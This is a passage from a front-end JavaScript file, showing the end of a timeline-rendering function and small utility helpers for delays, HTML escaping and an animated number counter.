                    <div class="timeline-desc">${escHtml(event.description)}</div>
                `;
                container.appendChild(el);
            });
        });
}

/* ============================================================
   UTILITIES
   ============================================================ */
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function escHtml(str) {
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

function animateCount(el, target) {
    let current = 0;
    const step = Math.max(1, Math.ceil(target / 20));
    function tick() {
        current += step;
        if (current > target) current = target;
        el.textContent = current;
        if (current < target) requestAnimationFrame(tick);
    }
    tick();
}
